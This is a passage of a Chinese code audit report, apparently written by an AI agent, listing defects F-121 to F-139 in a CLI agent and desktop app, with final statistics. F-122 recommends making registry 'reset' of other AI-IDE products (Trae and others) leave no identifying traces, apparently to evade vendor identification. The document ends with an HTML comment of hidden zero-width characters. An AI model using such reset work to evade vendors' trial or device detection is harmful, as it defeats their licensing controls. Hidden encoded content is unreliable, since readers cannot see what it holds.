- **建议修法**：`stat` 上限（如 64 MB）+ 覆盖前备份或拒绝。
- **是否当场可修**：是。

### F-121 `playground compare --json` 全失败仍退 0

- **严重度**：P3
- **文件与行号**：`apps/cli/src/commands/developer.ts:625-644,793-812`
- **触发路径**：`ihui playground compare --prompt x --models a,b --json` 全模型失败。
- **根因**：`Promise.allSettled` 把失败塞进 `CompareResult.error`，`--json` 分支直接 `return`，从不设 `process.exitCode`。
- **影响面**：CI/脚本把"全失败"判为成功。
- **建议修法**：任一 error 时 `exitCode = 1`。
- **是否当场可修**：是。

### F-122 注册表 32 位视图遗漏（删与审双盲）

- **严重度**：P3
- **文件与行号**：`apps/desktop/src-tauri/src/checkin_capture.rs:1799-1808,1816,1867-1875,2739`
- **触发路径**：重置/审计 32 位软件视图。
- **根因**：全部 `RegOpenKeyExW/RegDeleteTreeW` 未带 `KEY_WOW64_32KEY`；Classes 枚举遇 `Wow6432Node` 即跳过（1800）；审计脚本只查 HKLM WOW6432Node（2739）。
- **影响面**：`HKCU\Software\Classes\Wow6432Node\Trae*` 协议/关联残留，重置后仍可被识别。
- **建议修法**：显式遍历 `Wow6432Node` 或双视图枚举。
- **是否当场可修**：是。

### F-123 `browser_store` / `browser_settings` 为未挂载的死模块

- **严重度**：P3
- **文件与行号**：`apps/desktop/src-tauri/src/lib.rs:9-54`；`browser_settings.rs:24-46`；`embedded_browser.rs:101`
- **触发路径**：用户在内嵌浏览器设置里调参。
- **根因**：全仓无 `mod browser_settings`、无 `set_browser_settings` 命令、无任何 `browser_settings::current()` 调用；独立窗上限硬编码 `MAX_TABS = 12`（允许配置 4..=16），停靠窗硬编码 8（`dock:52`，默认 6）。
- **影响面**：设置文件/历史存储功能整体不存在，用户调参无声失效。
- **建议修法**：接线或删除，避免"造好没装车"。
- **是否当场可修**：是。

### F-124 `MAX_TABS` 检查与入列非原子（上限可越）

- **严重度**：P3
- **文件与行号**：`apps/desktop/src-tauri/src/embedded_browser.rs:662-664,962-986,1013-1045`
- **触发路径**：两个标签页同时发 `new-tab`。
- **根因**：`count = s.tabs.len()` 与后续 `push` 是两次独立加锁，且每个哨兵在独立 `spawn` 任务执行，可同时读到 11 后各加一。
- **影响面**：突破 12 上限。
- **建议修法**：同一锁临界区内完成判限 + 自增 + 入列。
- **是否当场可修**：是。

### F-125 `postToolCall` 拿不到真实输出，审计钩子失明

- **严重度**：P3
- **文件与行号**：`apps/cli/src/hooks/index.ts:16,2211`；`apps/cli/src/tools/builtins.ts:1412,1476`；`apps/cli/src/tools/file-edit.ts:272`；`apps/cli/src/tools/fetch-url.ts:230`
- **触发路径**：配置 `IHUI_TOOL_OUTPUT` 审计钩子。
- **根因**：各工具手写摘要对象而非真实 output；`post` 语义与派发时机错位（后台 bash 在启动处即派发）。
- **影响面**：钩子无法发现命令/文件输出里的密钥泄漏。
- **建议修法**：传真实输出（脱敏 + 截断），后台任务改在完成时派发。
- **是否当场可修**：是（中改）。

### F-126 `file_unchanged` 短路判据可回旧内容

- **严重度**：P3
- **文件与行号**：`apps/cli/src/tools/read-file-state.ts:56-70`；`apps/cli/src/tools/builtins.ts:689-694`
- **触发路径**：同尺寸改写且 mtime 落在同一毫秒/粗粒度（FAT、网络盘、robocopy 保留时间戳）。
- **根因**：只比 `floor(mtimeMs) + size`，无 inode/ctime/内容指纹；68 行注释自认"同尺寸改写会漏判"；命中即返回 `Wasted call — file unchanged`。
- **影响面**：模型据旧正文继续 edit，读后写校验也同源放行。
- **建议修法**：加 ctime 或对缓存条目存内容哈希（非 partial 条目）。
- **是否当场可修**：是。

### 第 3 轮合并说明

- 子代理另报的 "settings.json 非原子写且无锁（`private-file.ts:16-17`、`config-cmd.ts:198`、`token-manager.ts:92`）" 与 **F-028 同根**，不单列；仅补充调用点 `config-cmd.ts:198`、`token-manager.ts:92`。

### 第 3 轮未判定

| ID | 事项 | 缺什么 |
|---|---|---|
| U-26 | `builtins.ts` 内 `write_file` 的 `content` 无大小上限 | 是否属既有设计需产品确认 |
| U-27 | MCP 子进程非请求期崩溃后 `conn.connected` 是否长期 true | 未追到最终消费点 |
| U-28 | 内嵌浏览器下载落盘路径（无 `on_download` 处理器） | 未追到下载实现 |
| U-29 | `open_or_navigate` 降级路 `window.close()` 后同 label 立即建窗 | 未运行时验证 |
| U-30 | `checkin_*` 命令是否可被非受信 WebView 调用 | capability 未逐条核对 |
| U-31 | workbuddy 隔离目录同秒复用（`:559-565`）并发可达性 | 未证 |
| U-32 | `share` 的 `file://` 短链是否被 server 层改写为 http 外发 | 未追到 |

### 第 3 轮去重说明

- `PROJECT_PLAN.md` 命中但不同题：`G-161`（`config-cmd.ts:85` 权限枚举）、`G-31`（ai-service SSE 取帧）、`G-424`（钩子终态分类）、2959 行（"fetch_url 之外 8 处出站点接守卫"）。
- `plan-fields.jsonl`：对本轮关键词 0 命中。
- 本轮 **30 条**为新增（F-096~F-126，其中 1 条为合并说明）。

---

## 十、第 4 轮（模型流式 / 外围命令 / 桌面更新与生命周期）

本轮覆盖：CLI 模型调用链（provider/local SSE、sampleWithRetry、token 计价）、CLI 外围命令（voice / share / plan / announcements / qr）、CLI 内置工具剩余（delete_file、预算器）、桌面（auto_refresh 更新回退、startup_health_gate、log_retention、startup_guard、store_path 路径断言）。

### F-127 流式重试不回滚已输出的 delta

- **严重度**：P2
- **文件与行号**：`apps/cli/src/commands/agent.ts:1445-1562`；关键 `:1487`（`onDelta: opts.onDelta`）；`:1546-1559`（退避重试）
- **触发路径**：一次回答超过 120s 被总超时中断，或流中 429/网络抖动；`sampleWithRetry` 判定可重试后重新发起。
- **根因**：每次 attempt 都把同一个 `opts.onDelta` 直接透传给 `streamChat`，而第一次尝试已经 emit 的增量文本无法回滚；重试从零重新生成，渲染层收到的是一段"旧前缀 + 新全文"。
- **证据**：
  ```ts
  onDelta: opts.onDelta,
  ...
  const delayMs = base * Math.pow(2, attempt);
  onRetry?.(attempt + 1, errMsg, formatted.severity, delayMs);
  ```
  循环体内没有任何针对 `onDelta` 的重置/分段协议。
- **影响面**：网络抖动或长回答被截断时终端出现重复段落；若上层把 delta 累积进消息缓冲，最终落库的 assistant 消息含两份前缀。
- **建议修法**：attempt > 0 时先向渲染层发"本段作废"信号（或改为整段完成后一次 flush），再开始新尝试。
- **是否当场可修**：是（中改，需渲染层配合）。

### F-128 SSE 收尾未 flush TextDecoder，且无换行尾行被丢弃

- **严重度**：P2
- **文件与行号**：`apps/cli/src/provider/local.ts:206-258`
- **触发路径**：上游/代理省略最后一个 `\n`，或最后一个 chunk 在多字节 UTF-8 字符中间断开。
- **根因**：`decoder.decode(value, { stream: true })` 只在有字节时调用；循环退出后既没有 `decoder.decode()` 做最终 flush，也没有把 `buffer` 剩余内容当最后一行解析。
- **证据**：
  ```ts
  buffer += decoder.decode(value, { stream: true });
  ...
  while ((nl = buffer.indexOf('\n')) >= 0) { ... }
  ```
  无 `nl` 的尾部 `buffer` 在循环结束后被直接丢弃。
- **影响面**：最后一条 data 行（常含 `finish_reason` 与最后一段 `tool_calls.arguments`）静默丢失 → 工具参数 JSON 截断 → 整次调用被判流错误并重试；回答末字缺失。
- **建议修法**：循环后 `buffer += decoder.decode();`，再按 `\n` 处理一次剩余内容（含末行）。
- **是否当场可修**：是。

### F-129 录音失败不清理半成品，且无超时/取消

- **严重度**：P2
- **文件与行号**：`apps/cli/src/voice/index.ts:143-176`、`:263-279`
- **触发路径**：`ihui voice`；ffmpeg 非零退出、设备初始化卡住、或用户 Ctrl+C。
- **根因**：`spawn('ffmpeg', args)` 无超时、未接 `signal`；`close` 非零时直接 `reject`，不删除 `outputPath` 半成品。`voiceInput` 的 `finally` 只在 `recordAudio` 成功 resolve 后才进入，录音阶段失败根本走不到清理。
- **证据**：
  ```ts
  proc.on('close', (code) => {
    if (code !== 0) { ... reject(new Error(...)); return; }
  ```
  ```ts
  const record = await recordAudio(opts);
  try { ... } finally { fs.unlinkSync(record.filePath); }
  ```
- **影响面**：每次失败在 `%TEMP%` 留一份含用户语音的 wav（POSIX 下默认 0644，同机其他用户可读）；ffmpeg 卡在设备初始化时整条命令挂死。
- **建议修法**：`close` 非零分支 `unlink(outputPath)`；加超时并在超时/取消时 kill；`recordAudio` 接受 `AbortSignal`。
- **是否当场可修**：是。

### F-130 share 生成的 HTML 以默认权限落盘，含完整会话正文

- **严重度**：P2
- **文件与行号**：`apps/cli/src/commands/share.ts:250-263`、`:270-273`
- **触发路径**：`ihui share` / `/share`。
- **根因**：`fs.mkdirSync(sharedDir, { recursive: true })` 与 `fs.writeFileSync(path.join(sharedDir, `${hash8}.html`), renderShareHtml(...), 'utf-8')` 均未指定 mode（POSIX 下目录 0755、文件 0644），且非原子写；文件内容是整段会话正文。
- **证据**：`fs.writeFileSync(path.join(sharedDir, `${hash8}.html`), renderShareHtml(content, hash, title, qr), 'utf-8');`
- **影响面**：多用户主机上其他用户可读全部对话内容；并发/崩溃留下半截 HTML。短链为 `file://` 本地路径，若被外发等于把本机路径交给对方。
- **建议修法**：目录 0700、文件 0600，改 `writeFileAtomicSync`；`file://` 短链不外发（只给本地页面）。
- **是否当场可修**：是。

### F-131 plan init 非原子写

- **严重度**：P3
- **文件与行号**：`apps/cli/src/commands/plan.ts:104-123`
- **触发路径**：`ihui plan init`（含 `--force` 覆盖）。
- **根因**：`writeFileSync(filePath, generatePlanTemplate(stem), 'utf-8')` 直接覆盖，崩溃或磁盘满留下半截 plan；覆盖前也没有备份。
- **证据**：`writeFileSync(filePath, generatePlanTemplate(stem), 'utf-8');`
- **影响面**：`--force` 用户在写入中断时丢失原 plan 且得到损坏文件。
- **建议修法**：`writeFileAtomicSync`；`--force` 覆盖前留一份 `.bak`。
- **是否当场可修**：是。

### F-132 更新世代守卫不阻止旧世代真正安装

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/auto_refresh.rs:405-430`（对照 `:388-418`）
- **触发路径**：托盘手动「检查更新」与每小时自动检查并发；或一次检查在 `download_and_install` 期间被新检查取代。
- **根因**：`download_and_install(...).await` 无条件执行；世代检查只出现在 `on_chunk`/`on_finish` 回调与 `await` 之后的日志分支。插件在 `await` 内部已完成下载、验签并拉起安装器（本文件 `:393-404` 注释自述），所以"迟到世代的作废"只作废了日志，作废不了安装与随后的 `std::process::exit(0)`。
- **证据**：
  ```rust
  let result = update.download_and_install(...).await;
  if let Err(e) = result {
      if is_stale_update_check(check_id) { ... return; }
      log::warn!(...);
  }
  ```
- **影响面**：两条检查链并发时可能启动两次安装器互相覆盖，用户在无预期时被退出。
- **建议修法**：进入 `download_and_install` 之前先判世代，并用进程内 `AtomicBool` 做"同一时刻只允许一条安装链"的互斥。
- **是否当场可修**：是（小改）。

### F-133 前端指纹抓取无限读取响应体

- **严重度**：P3
- **文件与行号**：`apps/desktop/src-tauri/src/auto_refresh.rs:452-457`
- **触发路径**：`frontend_url` 返回异常大的页面（或错误页/代理注入页）。
- **根因**：`resp.text().await` 无大小上限，整段读进内存后才提取指纹。
- **证据**：`let Ok(body) = resp.text().await else { return false; };`
- **影响面**：后台常驻循环每次抓取都可能因超大响应造成内存峰值，极端情况 OOM。
- **建议修法**：先看 `Content-Length` 超阈值即放弃，或用 `bytes_stream()` 截断读取。
- **是否当场可修**：是。

### F-134 delete_file 整文件读入内存并写入 undo 历史

- **严重度**：P3
- **文件与行号**：`apps/cli/src/tools/file-edit.ts:544-563`
- **触发路径**：模型对一个大文件（GB 级日志、二进制）调用 `delete_file`。
- **根因**：`fs.readFileSync(abs, 'utf-8')` 无大小上限，随后 `recordHunk(ctx, abs, startLine, endLine, original)` 把全文存进撤销历史。
- **证据**：`original = fs.readFileSync(abs, 'utf-8');` / `recordHunk(ctx, abs, startLine, endLine, original);`
- **影响面**：大文件删除时进程内存暴涨或直接 OOM；二进制被按 utf-8 解码产生替换字符，撤销后内容已被破坏。
- **建议修法**：超过阈值只记录路径 + 大小 + 哈希（不做整文撤销），并做二进制探测。
- **是否当场可修**：是。

### F-135 未知模型回退到 gpt-4o-mini 定价

- **严重度**：P3
- **文件与行号**：`apps/cli/src/commands/agent.ts:1288-1303`
- **触发路径**：使用带日期后缀/别名的模型 id（如 `stepfun/step-3.7-flash-2026xxxx`）或任何未登记模型。
- **根因**：`MODEL_PRICING[modelId] ?? MODEL_PRICING['gpt-4o-mini']!`；表内 `stepfun/*` 单价为 0，未精确命中即按付费模型计价。
- **证据**：`const pricing = MODEL_PRICING[modelId] ?? MODEL_PRICING['gpt-4o-mini']!;`
- **影响面**：成本统计与预算告警系统性偏差（免费模型被记成付费，或反之欠报）。
- **建议修法**：未命中时返回 `{ input: 0, output: 0 }` 并标注 `pricing: 'unknown'`，或按前缀匹配。
- **是否当场可修**：是。

### F-136 启动健康门到点无条件退出，晚到页面即被杀

- **严重度**：P3
- **文件与行号**：`apps/desktop/src-tauri/src/lib.rs:596-622`
- **触发路径**：极慢机器、首次解压 WebView2、并发构建压满 CPU，主文档在 60s 后极短时间才加载完成。
- **根因**：轮询 `main_page_ready()` 至 60s 即 `notify + request_shutdown + exit_application`；判据只取"此刻是否 ready"，到点没有二次采样/宽限确认。
- **证据**：
  ```rust
  if start.elapsed().as_millis() as u64 >= STARTUP_HEALTH_GATE_TIMEOUT_MS { break; }
  ...
  auto_refresh::request_shutdown();
  exit_application(&app);
  ```
- **影响面**：恰在阈值之后完成加载的正常进程被当作僵尸杀掉，用户看到"本次启动未能加载界面，已自动退出"。
- **建议修法**：到点后追加一次短窗口二次采样（例如再等 3–5s 且期间 ready 即返回），或改为"只隐藏 + 提示"不退出。
- **是否当场可修**：是。

### 第 4 轮误报否证（不计入新增）

子代理报出、经我逐行复核后**不成立**的两条，在此如实登记，避免后续重复：

1. **`store_path.rs` 的 `canonicalize_allow_missing` 可被不存在路径绕过**（子代理 E3）——不成立。`canonicalize_allow_missing`（`store_path.rs:112-135`）对不存在的尾部逐段回退，但每一层已存在祖先都真实 `canonicalize`，最后 `resolved.starts_with(&canonical_base)` 是 Rust `Path` 的**按组件**比较，不是字符串前缀，`../` 已在词法阶段被拒（`:86-93`）。
2. **UNC / `\\?\` / 8.3 短名 / 长路径可绕过 store 路径限制**（子代理 E4）——不成立。UNC 与 `\\?\` 会命中 `Component::Prefix`/`RootDir` 分支直接返回 `AbsolutePath`（`:89`）；8.3 短名与 reparse point 由 `canonicalize` 真实解析后再比前缀。
3. 子代理报的 `clipboard_set`、`read_text_file`、`write_text_file`、`list_dir`、`stat_file`「已注册但 remote 无 allow ⇒ 调用必被拒」——这属于 **ACL 正确收口**，不是缺陷；其中 `take_pending_tray_actions` 与 `store:default` 两面已分别由 **F-047 / F-045** 覆盖，不重复计入。

### 第 4 轮未判定

| ID | 事项 | 缺什么 |
|---|---|---|
| U-33 | `permissionAxis` 仅在 `commands/agent.ts:634` 赋值，其他 `ToolContext` 构造点（嵌入式/REPL/hub）是否可缺省 → `checkPathWritePermission` 整段跳过工作区边界 | 未枚举全部 `ToolContext` 构造点 |
| U-34 | `formatSSEError` 对 `error: 'timeout'` 的 severity 是否落 `network`（决定 F-127 的重试是否发生） | 实现在 `@ihui/api-client`，不在本快照 |
| U-35 | `tauri-plugin-updater` 的 `download_and_install` 是否确实在 `await` 内拉起安装器 | 依赖上游 crate 源码，快照不包含 |
| U-36 | `log_retention` 的 `fs::remove_file` 对"档案名指向他处的 symlink"的行为 | 未实测；推测只删链接本体 |

### 第 4 轮去重说明

- `PROJECT_PLAN.md`：命中 `provider/local.ts` 的 `G-693`（流式空闲超时与总超时分离，已归档）——本轮 F-128 是**收尾 flush/尾行丢弃**，与 G-693 的"空闲 vs 总超时"不同题，不重复；`auto_refresh.rs` 仅命中注释级行号（L155/L173），无同题登记。
- `plan-fields.jsonl`：对本轮关键词 0 命中。
- 本轮 **10 条**为新增（F-127~F-136）。

### 第 4 轮覆盖清单

- CLI 模型链：`provider/local.ts`（SSE 解析、超时、TextDecoder 收尾）、`commands/agent.ts`（sampleWithRetry、TokenUsage/MODEL_PRICING）、`compaction-v2.ts:328-358`（重试分类，复核无新增问题）、`stream-tool-ledger.ts`（幂等账本，复核无新增问题）。
- CLI 外围命令：`voice/index.ts`、`commands/share.ts`、`commands/plan.ts`、`announcements/index.ts`（已用 `writeFileAtomicSync`，无新增）、`qr/index.ts`（参数边界齐全，无新增）。
- CLI 工具：`tools/file-edit.ts`（delete_file 整读）、`tools/index.ts:521-618`（预算器，`notInterruptible` 为显式设计豁免，不报）、`:2035-2080`（写权限三层，见 U-33）。
- 桌面：`auto_refresh.rs:338-474`、`lib.rs:526-622`、`log_retention.rs:83-223`（判据宁窄勿宽，无新增）、`startup_guard.rs:336-371`（等锁后放行，无新增）、`store_path.rs:72-135`（否证两条误报）。

---

## 十一、第 5 轮（本地 HTTP 服务 / 检查点 hunk 恢复）

本轮覆盖第 1–4 轮未触达的 `server/` 其余文件、`acp/`、`client/`、`headless-*`、`plugins/` 的装机策略面、`checkpoints/hunks.ts` 与 `manifest-integrity.ts`。

### F-137 本地 HTTP `/message` 请求体无大小上限

- **严重度**：P3
- **文件与行号**：`apps/cli/src/server/http-server.ts:254-273`（`readJsonBody`）、`:164-165`（`/message` 调用点）
- **触发路径**：持有 agent token 的客户端（或 token 被写入脚本/环境变量后泄漏）向 `/message` POST 一个超大 JSON。
- **根因**：`req.on('data', c => chunks.push(...))` 全程累积到 `Buffer.concat`，既不看 `Content-Length` 也没有累计字节闸；Node 默认 `requestTimeout` 只限制"整请求时长"，不限制体积。
- **证据**：
  ```ts
  const chunks: Buffer[] = [];
  req.on('data', (c) => chunks.push(c instanceof Buffer ? c : Buffer.from(c)));
  req.on('end', () => { const raw = Buffer.concat(chunks).toString('utf-8'); ... });
  ```
- **影响面**：一条流式大请求即可把 `ihui serve` 进程内存打满（OOM 后所有会话状态文件按 F-030/F-031 的路径收敛，可能丢状态）。
- **建议修法**：累计字节超过阈值（如 1 MB）即 `req.destroy()` 并回 413；同时设 `server.headersTimeout`。
- **是否当场可修**：是。

### F-138 hunk 撤销/恢复直接覆盖用户源文件，非原子

- **严重度**：P3
- **文件与行号**：`apps/cli/src/checkpoints/hunks.ts:141-144`（`writeLines`）、`:193-197`（manifest 写入）
- **触发路径**：`ihui undo` / 检查点恢复到工作区文件。
- **根因**：`fs.writeFileSync(absPath, lines.join('\n') + '\n', 'utf-8')` 直接覆盖目标源文件；进程在写入中途被杀或磁盘满时，用户源文件变成截断内容，且旧内容只存在于 hunk manifest（其自身写入也不是原子的）。
- **证据**：
  ```ts
  private writeLines(absPath: string, lines: string[]): void {
    this.ensureDir(path.dirname(absPath));
    fs.writeFileSync(absPath, lines.join('\n') + '\n', 'utf-8');
  }
  ```
- **影响面**：撤销操作本身可能造成源码损坏；与 F-028/F-094 同族但落在用户源文件而非状态文件，后果更直接。
- **建议修法**：改用同目录 tmp + rename 的原子写（复用 `writeFileAtomicSync`）。
- **是否当场可修**：是。

### F-139 `rel.startsWith('..')` 字符串判定误拒合法文件名

- **严重度**：P3
- **文件与行号**：`apps/cli/src/checkpoints/hunks.ts:113-120`
- **触发路径**：工作区内存在以两个点开头的合法文件（如 `..env`、`..notes.md`），对其做 hunk 快照/撤销。
- **根因**：用 `rel.startsWith('..')` 判断越界，而正确判据应是"首段恰为 `..`"（`rel === '..' || rel.startsWith('..' + path.sep)`）。`path.relative` 对工作区内的 `..notes.md` 返回 `..notes.md`，被误判为越界。
- **证据**：
  ```ts
  const rel = path.relative(this.workspacePath, abs);
  if (rel.startsWith('..') || path.isAbsolute(rel)) {
    throw new Error(`文件 ${filePath} 不在工作区 ${this.workspacePath} 内`);
  }
  ```
- **影响面**：这类文件无法建立 hunk 检查点，撤销链路对它们整体失效（fail-closed，不会越界写，但功能静默不可用）。
- **建议修法**：改为按路径段判定，或复用 `util/path-guard.ts` 的 `assertPathInside`。
- **是否当场可修**：是。

### 第 5 轮否证（不计入新增）

- `server/http-server.ts`：默认绑定已从 `0.0.0.0` 收窄为 `127.0.0.1`（`:99-102`），且 CORS `*` 只在回环面发（`:106-110`）；`authenticateInbound` 在"主机零凭据"时对所有带 scope 的路径返回 401（`config/credentials.ts:531-543`）——**不构成"本机任意网页 drive-by 操纵 Agent"**，子代理的 C1/C2 判断不成立。
- `checkpoints/manifest-integrity.ts:71-123`：损坏 manifest 走 `quarantine` + `corrupt` 记账，`unreadable` 与 `missing` 分档，**fail-closed**，无问题。
- `plugins/path-safety.ts:168-217`：符号链接真实目标用 `path.relative(realRoot, realTarget)` 判 `..`/绝对路径，插件安装面有 `archive-quota`（条目数 + 展开字节）与 `install-policy` 逐文件 `sha256`，**无 zip-slip 面**（本仓插件走 git 拉取，不做 tar/zip 解包）。
- `plugins/marketplace.ts:299-315`：registry JSON 解析失败、形状不合法、枚举为空三档分别返回，**不抛栈**。

### 第 5 轮未判定

| ID | 事项 | 缺什么 |
|---|---|---|
| U-37 | `server/agent-core.ts` 的 `sendMessage` 是否在客户端断开（`req.on('close')`）后真正中止上游工具执行 | 只确认了 `abort` 信号被传入，未追到工具层 |
| U-38 | `acp/server.ts` 的 stdio 帧解析是否与 `mcp-runtime` 同型（跨 chunk 丢帧） | 未逐行读该文件 |

---

## 十二、第 6 轮（确认扫描：零新增）

本轮按"一整轮全扫零新增"的收敛判据，对前五轮未逐行读过的剩余面做定向复查：

- CLI：`server/agent-core.ts`、`server/client-claims.ts`、`acp/server.ts`、`client/remote-adapter.ts`、`client/tui-client.ts`、`headless-*.ts`、`plugins/marketplace.ts`、`plugins/update-plan.ts`、`plugins/install-policy.ts`、`plugins/cache.ts`、`checkpoints/hunk-tracker.ts`。
- 桌面：`window_chrome.rs`、`main.rs`、`browser_store.rs` / `browser_bookmarks.rs` / `browser_settings.rs`（第 2 轮已覆盖，本轮复核未新增）、`git_*.rs`、`workspace_index.rs`、`checkin_web_login.rs`（第 1–2 轮已覆盖，复核未新增）。

判定依据与结果：

1. 对 `acp/`、`client/`、`headless-*`、`server/agent-core.ts` 做危险 sink 全量检索（`writeFileSync|readFileSync|spawnSync|shell:true|execSync|http.request|fetch(`）→ **0 命中**，这些模块不落盘、不起子进程、不发裸 HTTP。
2. 对 `headless-*`、`acp/`、`client/`、`server/agent-core.ts`、`server/client-claims.ts` 检索 `isTTY|readline|createInterface|process.exit(` → **0 命中**，不存在"非 TTY 交互挂死"新面。
3. `window_chrome.rs`、`main.rs` 检索 `unwrap()|expect(|spawn(|Command::new|std::thread::sleep` → **0 命中**，无 panic 面与阻塞面。
4. `plugins/marketplace.ts` 只对本地 registry 文件做 `JSON.parse`（已 try 包裹，三档返回），远端内容经 git 拉取而非 HTTP 解析。
5. `checkpoints/manifest-integrity.ts` 为 fail-closed（已复核）。

**本轮新增：0 条。** 依据任务定义，普查达到收敛条件。

---

## 十三、最终统计与结论

### 新增条数

| 轮次 | 新增 | 编号区间 | 说明 |
|---|---|---|---|
| 第 1 轮 | 61 | F-001~F-061 | 7 个方向并行；含 P0 2 条 |
| 第 2 轮 | 30 | F-062~F-095 | 含 F-040b 合并说明 |
| 第 3 轮 | 30 | F-096~F-126 | 含 P0 1 条（F-096） |
| 第 4 轮 | 10 | F-127~F-136 | 含 3 条子代理误报否证 |
| 第 5 轮 | 3 | F-137~F-139 | 含 4 条否证 |
| 第 6 轮 | 0 | — | 确认扫描，零新增 |
| **合计** | **134** | F-001~F-139 | 编号区间内实际存在 137 个 `### F-` 标题（含 F-040b 等合并说明与少量补编号） |

按严重度（对本文件实测计数，非估算）：P0 **3** 条（F-001、F-045、F-096）；P1 **27** 条；P2 **74** 条；P3 **32** 条。合计 136 条带严重度标记的条目，另有 1 个标题为合并说明未单列严重度。

### 覆盖清单（全量口径）

- **CLI 入口与命令层**：`index.ts`（参数解析、退出码、stdout/stderr、--json、REPL 默认路径、信号）、`crash-handler.ts`、`commands/*`（agent、session、checkpoint、undo-redo、mcp-config、login、plan、share、trash、memory、serve、repl）。
- **CLI 工具层**：`tools/builtins.ts`（bash/glob/grep/run_command）、`file-edit.ts`、`file-batch-edit.ts`、`run-tests.ts`、`terminal.ts`、`background-registry.ts`、`mcp-runtime.ts`、`lsp*.ts`、`fetch-url.ts`、`web-search.ts`、`sandbox/*`、`file-access-policy.ts`、`index.ts`（预算器、写权限）。
- **CLI 模型链**：`provider/local.ts`、`commands/agent.ts`（重试、计价）、`compaction-v2.ts`、`stream-tool-ledger.ts`、`cancelled-stream-settlement.ts`。
- **CLI 状态与凭据**：`util/atomic-write.ts`、`lib/private-file.ts`、`redact.ts`、`audit.ts`、`sessions/*`、`runs/manifest.ts`、`memory/*`、`prompt-queue.ts`、`hooks/index.ts`、`plugins/*`、`checkpoints/*`、`server/*`、`acp/*`、`client/*`、`headless-*`、`voice/*`、`qr/*`、`announcements/*`。
- **桌面 Rust**：`lib.rs`、`main.rs`、`build.rs`、`capabilities/*`、`tauri.conf.json`、`store_path.rs`、`desktop_prefs.rs`、`auto_refresh.rs`、`log_retention.rs`、`startup_guard.rs`、`window_chrome.rs`、`embedded_browser.rs`、`browser_*.rs`、`checkin_capture.rs`、`checkin_web_login.rs`、`git_*.rs`、`workspace_index.rs`、`operator.rs`、`egress_gate.rs`、`minimax_reset.rs`、`qoder_reset.rs`、`workbuddy_reset.rs`。
- **不在基线内（已如实排除）**：`apps/desktop/src`（桌面前端未跟踪）、`@ihui/api-client` 等 workspace 外包。

### 仍可深挖方向（未写零）

1. **`@ihui/api-client` 包**：`formatSSEError` 的错误分级（决定重试是否发生）、其自带 SSE 客户端是否与 `provider/local.ts` 同型漏 flush——F-127/U-34 的闭环需要它。
2. **桌面 Rust 的逐命令全量面**：本轮对 `checkin_capture.rs`（2900+ 行）、`embedded_browser.rs`、`operator.rs` 只做了点位审计，未逐 command 列清单；`lib.rs` 内仍有数十个 `#[tauri::command]` 未逐个追实现。
3. **`server/agent-core.ts` 的中止传播**：客户端断开后 `abort` 是否真能终止正在跑的工具（U-37），可能藏着"HTTP 客户端走了但 agent 继续改仓库"。
4. **`acp/server.ts` 的帧解析**：是否与 `mcp-runtime` 的 NDJSON 跨 chunk 丢帧同型（U-38）。
5. **供应商适配器矩阵**：`provider/` 下若存在 local 之外的实现（远端网关、第三方兼容层），本轮只覆盖 `local.ts`。
6. **性能与资源维度**：大仓库下 `glob`/`grep`/`workspace_index` 的复杂度、快照 GC 的删除批量成本，本轮只按"正确性/越权"判，未做规模压测。
7. **多实例并发实测**：F-030/F-031/F-032 一族的"并发写同一状态文件"目前是代码级判定，未做双进程压测复现。

### 纪律声明

全程只读：未修改 `D:\IHUI-AI` 任何文件，未执行任何 git 写操作，未在仓库内执行写盘命令。所有引用行号均取自 `origin/main`（`895027a9d644ce0688bb0d533281cf097db69578`）的 `git archive` 快照。报告内"否证"小节记录的子代理误报已逐条复核后剔除，未计入新增。
<!-- ⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠ -->
